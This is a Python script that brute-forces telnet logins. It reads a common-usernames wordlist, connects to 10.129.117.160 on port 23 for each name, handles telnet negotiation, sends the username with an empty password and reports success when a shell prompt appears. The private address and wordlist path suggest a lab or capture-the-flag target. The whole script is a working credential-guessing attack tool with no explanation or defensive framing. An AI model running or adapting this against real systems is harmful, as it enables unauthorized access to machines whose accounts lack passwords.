import socket
import sys
from time import sleep

with open("/usr/share/seclists/Usernames/top-usernames-shortlist.txt", "r") as f:
    users = f.read().splitlines()

def log():
    for user in users:
        try:
            # Open a NEW connection for every user
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # s.settimeout(5)
            s.connect(("10.129.117.160", 23))
            
            # Handle Negotiation
            while True:
                data = s.recv(1024, socket.MSG_PEEK)
                if not data or data[0] != 255:
                    break
                packet = s.recv(3)
                s.send(bytes([255, 252, packet[2]]))
            
            # 1. Get Login Prompt
            resp = s.recv(1024).decode(errors='ignore')
            if "login" in resp.lower():
                print(f"[*] Sending username: {user}")
                s.send(user.encode() + b"\n")
                
                # 2. Get Password Prompt (or Shell)
                sleep(1)
                resp = s.recv(1024).decode(errors='ignore')
                
                if "password" in resp.lower():
                    print(f"[-] {user} requires a password. Trying empty...")
                    s.send(b"\n") # Send empty password
                    sleep(1)
                    resp = s.recv(1024).decode(errors='ignore')

                if any(term in resp for term in ["@", "#", "$", "Last login"]):
                    print(f"!!! SUCCESS: Logged in as {user} !!!")
                    print(f"Banner:\n{resp}")
                    s.close()
                    sys.exit()
            
            s.close() # Close and move to next user
        except Exception as e:
            print(f"[!] Error on {user}: {e}")

if __name__ == "__main__":
    log()
